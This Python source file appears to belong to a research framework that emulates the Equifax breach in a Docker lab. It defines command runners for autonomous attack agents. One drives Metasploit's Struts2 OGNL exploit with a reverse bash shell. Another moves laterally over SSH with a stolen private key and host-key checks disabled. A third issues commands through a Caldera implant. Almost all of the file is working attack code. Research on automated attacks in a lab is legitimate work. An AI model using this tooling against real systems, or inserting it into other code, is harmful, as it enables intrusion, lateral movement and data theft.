"""
Low-level command primitives: the underlying operations task agents use to act
(run a command on a host, read a file, etc.).

These are the verified "hands" ported from the standalone baseline PoC
(equifax/webserver/attack/runners.py):

- CommandRunner : the shared interface -- run ONE command, return its output.
- WebShell      : a hand on the webserver, reached through the Struts bug via Metasploit.
- SshRunner     : a hand on the database, reached over SSH with a stolen private key.

The task agents (FindInfo / LateralMove / Exfiltrate) build on these and write
their results back into the EnvironmentStateService.
"""

import shlex
import subprocess
from abc import ABC, abstractmethod


class CommandRunner(ABC):
    """A 'hand' that runs ONE command on some machine and returns its output."""

    @abstractmethod
    def run(self, command: str) -> str:
        raise NotImplementedError


# Markers we wrap around the real output so we can pull it out of Metasploit's
# noisy logs. They just need to be words unlikely to collide with real output.
_BEGIN = "___INCALMO_BEGIN___"
_END = "___INCALMO_END___"


class WebShell(CommandRunner):
    """
    A 'hand' on the WEBSERVER, reached through the Struts bug via Metasploit.

    Each run() drives Metasploit once: exploit -> shell -> run one command.
    """

    def __init__(
        self,
        rhost: str = "10.0.0.2",
        rport: int = 8080,
        target_uri: str = "/fileupload/upload.action",
        docker_network: str = "equifax-seg_extnet",
        msf_image: str = "metasploitframework/metasploit-framework",
        session_wait: int = 10,              # seconds to wait for the shell to call back
    ):
        self.rhost = rhost
        self.rport = rport
        self.target_uri = target_uri
        self.docker_network = docker_network
        self.msf_image = msf_image
        self.session_wait = session_wait

    def run(self, command: str) -> str:
        argv = self._build_tool_command(command)
        result = subprocess.run(
            argv,
            capture_output=True,
            text=True,
            timeout=180,                      # msf startup (~30s) + wait + exploit
        )
        return self._extract_output(result.stdout)

    def _build_tool_command(self, command: str) -> list[str]:
        # On the target shell: print BEGIN, run the real command, print END.
        # Join with '&&' (not ';') because msfconsole treats ';' as its own
        # command separator and would break the line.
        wrapped = f"echo {_BEGIN} && {command} && echo {_END}"

        msf_script = "; ".join([
            "use exploit/multi/http/struts2_content_type_ognl",
            f"set RHOSTS {self.rhost}",
            f"set RPORT {self.rport}",
            f"set TARGETURI {self.target_uri}",
            "set payload cmd/unix/reverse_bash",
            "run -j",                          # fire it; handler runs as a background job
            f"sleep {self.session_wait}",      # wait for the target to connect back
            f'sessions -c "{wrapped}"',        # run our command on the new shell session
            "exit -y",
        ])

        return [
            "docker", "run", "--rm",
            "--network", self.docker_network,
            self.msf_image,
            "./msfconsole", "-q", "-x", msf_script,
        ]

    def _extract_output(self, raw: str) -> str:
        # The markers also appear in Metasploit's "Running '...'" echo line, so
        # take the text after the LAST begin marker, up to the next end marker.
        if _BEGIN in raw and _END in raw:
            return raw.split(_BEGIN)[-1].split(_END)[0].strip()
        # Markers missing => something went wrong; hand back the raw log to debug.
        return raw.strip()


class SshRunner(CommandRunner):
    """
    A 'hand' on the DATABASE, reached over SSH with the stolen private key.

    Same .run() interface as WebShell; different machine. This is the result of
    'lateral movement'. The database is only reachable from inside the lab
    network, so we run an ssh client in a throwaway container attached to that
    network (the local 'equifax-webserver' image ships an ssh client).
    """

    def __init__(
        self,
        host: str,
        user: str,
        private_key: str,
        docker_network: str = "equifax-seg_intnet",
        image: str = "equifax-seg-webserver",
    ):
        self.host = host
        self.user = user
        self.private_key = private_key
        self.docker_network = docker_network
        self.image = image

    def run(self, command: str) -> str:
        # Feed the key in via stdin, write it to a file inside the container,
        # then ssh. This avoids quoting the multi-line key and key-file
        # permission complaints.
        remote = (
            "cat > /tmp/k && chmod 600 /tmp/k && "
            "ssh -i /tmp/k "
            "-o StrictHostKeyChecking=no "
            "-o UserKnownHostsFile=/dev/null "
            "-o BatchMode=yes "
            f"{self.user}@{self.host} {shlex.quote(command)}"
        )
        argv = [
            "docker", "run", "--rm", "-i",     # -i so the container can read stdin
            "--network", self.docker_network,
            self.image,
            "bash", "-c", remote,
        ]
        result = subprocess.run(
            argv,
            input=self.private_key + "\n",     # the stolen key (+ trailing newline)
            capture_output=True,
            text=True,
            timeout=60,
        )
        return result.stdout.strip()


class CncRunner(CommandRunner):
    """
    A 'hand' on a host that already has a Caldera implant beaconing back.

    Same .run() interface as WebShell / SshRunner, but commands flow through the
    C&C service (Caldera) over a persistent implant -- no re-exploiting. This is
    the faithful post-exploitation channel the paper uses.

    `cnc` is a CncService; `paw` is the implant's Caldera id on the target host.
    """

    def __init__(self, cnc, paw: str):
        self.cnc = cnc
        self.paw = paw

    def run(self, command: str) -> str:
        return self.cnc.execute_command(self.paw, command)
